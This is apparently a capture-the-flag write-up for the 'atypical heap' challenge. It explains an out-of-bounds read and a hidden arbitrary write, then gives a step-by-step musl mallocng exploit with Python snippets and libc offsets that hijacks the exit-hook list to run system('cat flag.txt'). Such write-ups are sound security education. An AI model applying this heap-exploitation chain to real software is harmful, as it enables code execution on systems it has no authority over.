# atypical heap

`atypical heap` ships the same vulnerable program shape as the later revenge variant:

- an out-of-bounds read in `read_note`
- a hidden aligned 8-byte arbitrary write behind menu option `5`

On the provided files, the reliable exploit path is the same musl `mallocng` metadata attack:

1. leak heap metadata with the OOB read
2. forge allocator bookkeeping to turn the next allocation into a libc leak
3. hijack musl's exit-hook list

Final flag:

```text
CTF{0h_s0_y0u_kn0w_h0w_t0_expl01t_mus1_t00_huh!?_c9c4ad670ecbd791}
```

## Protections

The binary is:

```text
Full RELRO
NX enabled
PIE enabled
No canary
```

The service runs the program through the bundled `libc.so`, which is musl. That matters because both the leak and the final control-flow hijack are musl-specific.

## Vulnerabilities

### 1. OOB read

`NOTE_READ` validates the requested size only against `MAX_NOTE_SIZE`, not against the size of the selected note:

```c
case NOTE_READ:
    idx = get_idx();

    printf("size: ");
    if (scanf("%u", &sz) != 1)
        errx(1, "invalid input");

    if (sz > MAX_NOTE_SIZE) {
        puts("invalid size");
        break;
    }

    if (notes[idx].data == NULL) {
        puts("note not allocated");
        break;
    }
    write(1, notes[idx].data, sz);
```

So a `0x70` note can still be read back with length `0x100`, exposing adjacent musl allocator state.

### 2. Hidden arbitrary write

The menu says:

```c
puts("5. Exit");
```

but the actual constants are:

```c
#define NOTE_MAGIC 5
#define NOTE_EXIT 6
```

and choice `5` performs:

```c
scanf("%p", &ptr);
scanf("%lu", &value);
*ptr = value;
```

with only one restriction: the address must be 8-byte aligned.

The `magic_used` flag is also dead code. It gets set, but nothing checks it afterward, so the arbitrary write is reusable.

## Exploit Strategy

The verified exploit is:

1. allocate three `0xa0` notes and over-read the third one
2. recover musl `mallocng` metadata from the tail of that leak
3. use the hidden write primitive to splice a fake metadata node into musl's linked state
4. allocate once more and read back a libc pointer
5. rewrite musl's exit list so `exit(0)` becomes `system("cat flag.txt")`

## Stage 1: leak musl allocator metadata

Allocate three notes of size `0xa0` and fill them:

```python
alloc(0, 0xA0)
alloc(1, 0xA0)
alloc(2, 0xA0)
```

Then read note `2` with size `0x100`.

The final 16 bytes of that over-read expose musl allocator data:

```python
meta = u64(leak[0xF0:0xF8])
hdr2 = u64(leak[0xF8:0x100])
```

On a local run:

```text
meta = 0x5555...f130
hdr2 = 0x1e00000000000
```

That is the foothold into musl `mallocng`.

## Stage 2: forge metadata and leak libc

Free note `0` and create a fake allocator node just before the real metadata:

```python
fake = meta - 0x20

magic(fake, meta)
magic(fake + 8, hdr2)
magic(meta + 0x10, fake)
```

Effectively:

- `fake` becomes a forged metadata record
- the real metadata now points at our forged one
- the next `malloc(0xA0)` follows attacker-controlled bookkeeping

After that corruption, allocate note `3` and read it back with size `0x100`.

The second leak contains a libc pointer at offset `0x28`:

```python
group_ptr = u64(leak2[0x28:0x30])
libc_base = group_ptr - 0xA6CD0
```

That yields a stable libc base with ASLR enabled.

## Stage 3: hijack musl exit hooks

musl stores `atexit` handlers in a linked list processed by `__funcs_on_exit`.

Disassembly shows the call pattern:

```text
func pointer  = [head + index*8 + 0x8]
func argument = [head + index*8 + 0x108]
```

The exploit targets these libc offsets:

```python
LIBC_BUILTIN_OFF    = 0xA36A0
LIBC_HEAD_OFF       = 0xA5DC8
LIBC_SLOT_QWORD_OFF = 0xA5FE0
LIBC_SYSTEM_OFF     = 0x48368
```

Note `1` already holds our command string:

```python
b"cat flag.txt\\x00"
```

Once libc is known, we forge a single exit callback:

```python
builtin  = libc_base + 0xA36A0
head     = libc_base + 0xA5DC8
slot_qw  = libc_base + 0xA5FE0
system   = libc_base + 0x48368
cmd_ptr  = group_ptr + 0x10

magic(builtin, 0)                # next = NULL
magic(builtin + 8, system)       # funcs[0] = system
magic(builtin + 0x108, cmd_ptr)  # args[0] = "cat flag.txt"
magic(head, builtin)             # head = builtin
magic(slot_qw, 1 << 32)          # slot = 1, lock = 0
```

The `slot` field lives in the upper 4 bytes of the qword at `slot_qw`, so `1 << 32` is the minimal aligned write that leaves musl in a valid state and selects entry `0`.

## Stage 4: trigger the hidden real exit

Menu option `6` is the actual exit path:

```python
menu(6)
```

That calls `exit(0)`, musl walks the forged exit list, and executes:

```c
system("cat flag.txt");
```

which prints the flag.

## Solver

The helper in [solve_atypical_heap.py](./solve_atypical_heap.py) reproduces the verified exploit without pwntools. It can run locally against the provided files or remotely against the service.

Local verification against the supplied challenge files prints the same flag:

```text
CTF{0h_s0_y0u_kn0w_h0w_t0_expl01t_mus1_t00_huh!?_c9c4ad670ecbd791}
```
